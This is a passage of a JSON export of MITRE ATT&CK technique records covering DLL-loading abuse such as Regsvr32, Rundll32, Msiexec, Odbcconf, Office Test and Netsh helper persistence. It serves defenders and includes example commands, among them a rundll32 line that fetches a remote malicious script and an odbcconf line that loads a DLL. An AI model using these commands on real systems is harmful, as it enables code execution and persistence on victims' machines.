part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
    "technique_references": [
      {
        "source_name": "NodeJS",
        "url": "https://nodejs.org/",
        "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "JScrip May 2018",
        "url": "https://docs.microsoft.com/windows/win32/com/translating-to-jscript",
        "description": "Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft JScript 2007",
        "url": "https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript",
        "description": "Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript …. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Windows Scripts",
        "url": "https://docs.microsoft.com/scripting/winscript/windows-script-interfaces",
        "description": "Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Apple About Mac Scripting 2016",
        "url": "https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html",
        "description": "Apple. (2016, June 13). About Mac Scripting. Retrieved April 14, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "SpecterOps JXA 2020",
        "url": "https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5",
        "description": "Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "SentinelOne macOS Red Team",
        "url": "https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/",
        "description": "Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary Silver Sparrow Feb2021",
        "url": "https://redcanary.com/blog/clipping-silver-sparrows-wings/",
        "description": "Tony Lambert. (2021, February 18). Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight. Retrieved April 20, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "MDSec macOS JXA and VSCode",
        "url": "https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/",
        "description": "Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans with VSCode Extensions. Retrieved April 20, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a",
    "platform": "windows|office-365",
    "tid": "T1137.002",
    "technique": "Office Test",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)\n\nThere exist user and global Registry keys for the Office Test feature:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
    "technique_references": [
      {
        "source_name": "Hexacorn Office Test",
        "url": "http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/",
        "description": "Hexacorn. (2014, April 16). Beyond good ol’ Run key, Part 10. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Office Test Sofacy",
        "url": "https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/",
        "description": "Falcone, R. (2016, July 20). Technical Walkthrough: Office Test Persistence Method Used In Recent Sofacy Attacks. Retrieved July 3, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f",
    "platform": "windows",
    "tid": "T1218.002",
    "technique": "Control Panel",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)\n\nMalicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)",
    "technique_references": [
      {
        "source_name": "Microsoft Implementing CPL",
        "url": "https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx",
        "description": "M. (n.d.). Implementing Control Panel Items. Retrieved January 18, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro CPL Malware Jan 2014",
        "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
        "description": "Mercês, F. (2014, January 27). CPL Malware - Malicious Control Panel Items. Retrieved January 18, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro CPL Malware Dec 2013",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/",
        "description": "Bernardino, J. (2013, December 17). Control Panel Files Used As Malicious Attachments. Retrieved January 18, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Reaver Nov 2017",
        "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/",
        "description": "Grunzweig, J. and Miller-Osborn, J. (2017, November 10). New Malware with Ties to SunOrcal Discovered. Retrieved November 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ESET InvisiMole June 2020",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf",
        "description": "Hromcova, Z. and Cherpanov, A. (2020, June). INVISIMOLE: THE HIDDEN PART OF THE STORY. Retrieved July 16, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336",
    "platform": "windows",
    "tid": "T1218.007",
    "technique": "Msiexec",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
    "technique_references": [
      {
        "source_name": "TrendMicro Msiexec Feb 2018",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/",
        "description": "Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Msiexec",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/",
        "description": "LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft msiexec",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec",
        "description": "Microsoft. (2017, October 15). msiexec. Retrieved January 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AlwaysInstallElevated 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated",
        "description": "Microsoft. (2018, May 31). AlwaysInstallElevated. Retrieved December 14, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071",
    "platform": "windows",
    "tid": "T1218.008",
    "technique": "Odbcconf",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) \n",
    "technique_references": [
      {
        "source_name": "Microsoft odbcconf.exe",
        "url": "https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017",
        "description": "Microsoft. (2017, January 18). ODBCCONF.EXE. Retrieved March 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Odbcconf",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "description": "LOLBAS. (n.d.). Odbcconf.exe. Retrieved March 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro Squiblydoo Aug 2017",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/",
        "description": "Bermejo, L., Giagone, R., Wu, R., and Yarochkin, F. (2017, August 7). Backdoor-carrying Emails Set Sights on Russian-speaking Businesses. Retrieved March 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro Cobalt Group Nov 2017",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/",
        "description": "Giagone, R., Bermejo, L., and Yarochkin, F. (2017, November 20). Cobalt Strikes Again: Spam Runs Use Macros and CVE-2017-8759 Exploit Against Russian Banks. Retrieved March 7, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
    "platform": "windows",
    "tid": "T1218.010",
    "technique": "Regsvr32",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
    "technique_references": [
      {
        "source_name": "FireEye Regsvr32 Targeting Mongolian Gov",
        "url": "https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html",
        "description": "Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Regsvr32",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
        "description": "LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Regsvr32",
        "url": "https://support.microsoft.com/en-us/kb/249873",
        "description": "Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Carbon Black Squiblydoo Apr 2016",
        "url": "https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/",
        "description": "Nolen, R. et al.. (2016, April 28). Threat Advisory: “Squiblydoo” Continues Trend of Attackers Using Native OS Tools to “Live off the Land”. Retrieved April 9, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
    "platform": "windows",
    "tid": "T1218.011",
    "technique": "Rundll32",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
    "technique_references": [
      {
        "source_name": "rundll32.exe defense evasion",
        "url": "https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/",
        "description": "Ariel silver. (2022, February 1). Defense Evasion Techniques. Retrieved April 8, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Attackify Rundll32.exe Obscurity",
        "url": "https://www.attackify.com/blog/rundll32_execution_order/",
        "description": "Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "This is Security Command Line Confusion",
        "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
        "description": "B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Github NoRunDll",
        "url": "https://github.com/gtworek/PSBits/tree/master/NoRunDll",
        "description": "gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro CPL",
        "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
        "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--379809f6-2fac-42c1-bd2e-e9dee70b27f8",
    "platform": "windows",
    "tid": "T1505.005",
    "technique": "Terminal Services DLL",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)\n\n[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
    "technique_references": [
      {
        "source_name": "James TermServ DLL",
        "url": "https://twitter.com/james_inthe_box/status/1150495335812177920",
        "description": "James. (2019, July 14). @James_inthe_box. Retrieved March 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft System Services Fundamentals",
        "url": "https://social.technet.microsoft.com/wiki/contents/articles/12229.windows-system-services-fundamentals.aspx",
        "description": "Microsoft. (2018, February 17). Windows System Services Fundamentals. Retrieved March 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Remote Desktop Services",
        "url": "https://docs.microsoft.com/windows/win32/termserv/about-terminal-services",
        "description": "Microsoft. (2019, August 23). About Remote Desktop Services. Retrieved March 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "RDPWrap Github",
        "url": "https://github.com/stascorp/rdpwrap",
        "description": "Stas'M Corp. (2014, October 22). RDP Wrapper Library by Stas'M. Retrieved March 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Windows OS Hub RDP",
        "url": "http://woshub.com/how-to-allow-multiple-rdp-sessions-in-windows-10/",
        "description": "Windows OS Hub. (2021, November 10). How to Allow Multiple RDP Sessions in Windows 10 and 11?. Retrieved March 28, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847",
    "platform": "macos",
    "tid": "T1546.006",
    "technique": "LC_LOAD_DYLIB Addition",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)",
    "technique_references": [
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847",
    "platform": "macos",
    "tid": "T1546.006",
    "technique": "LC_LOAD_DYLIB Addition",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)",
    "technique_references": [
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed",
    "platform": "windows",
    "tid": "T1546.007",
    "technique": "Netsh Helper DLL",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",
    "technique_references": [
      {
        "source_name": "Demaske Netsh Persistence",
        "url": "https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html",
        "description": "Demaske, M. (2016, September 23). USING NETSHELL TO EXECUTE EVIL DLLS AND PERSIST ON A HOST. Retrieved April 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Netsh",
        "url": "https://technet.microsoft.com/library/bb490939.aspx",
        "description": "Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Github Netsh Helper CS Beacon",
        "url": "https://github.com/outflankbv/NetshHelperBeacon",
        "description": "Smeets, M. (2016, September 26). NetshHelperBeacon. Retrieved February 13, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed",
    "platform": "windows",
    "tid": "T1546.007",
    "technique": "Netsh Helper DLL",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",
    "technique_references": [
      {
        "source_name": "Demaske Netsh Persistence",
        "url": "https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html",
        "description": "Demaske, M. (2016, September 23). USING NETSHELL TO EXECUTE EVIL DLLS AND PERSIST ON A HOST. Retrieved April 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Netsh",
        "url": "https://technet.microsoft.com/library/bb490939.aspx",
        "description": "Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.",
        "external_id": "none"
      },
      {
